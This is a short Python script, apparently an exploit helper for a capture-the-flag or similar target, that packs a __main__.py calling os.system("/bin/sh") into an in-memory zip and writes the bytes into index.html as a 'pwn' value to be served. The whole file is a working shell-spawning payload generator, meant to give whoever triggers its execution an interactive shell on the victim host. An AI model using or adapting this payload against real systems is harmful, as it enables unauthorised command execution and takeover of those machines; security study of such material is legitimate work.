import tempfile
import zipfile


def create_zip_payload() -> bytes:
    file_name = "__main__.py"
    file_content = b'import os;os.system("/bin/sh")'

    with tempfile.TemporaryFile(suffix=".zip") as f:
        with zipfile.ZipFile(f, "w") as z:
            z.writestr(file_name, file_content)
        f.seek(0)
        return f.read()


def main() -> None:
    print(create_zip_payload())

    with open("index.html", "w") as f:
        f.write(f"pwn={create_zip_payload()!r}")


if __name__ == "__main__":
    main()
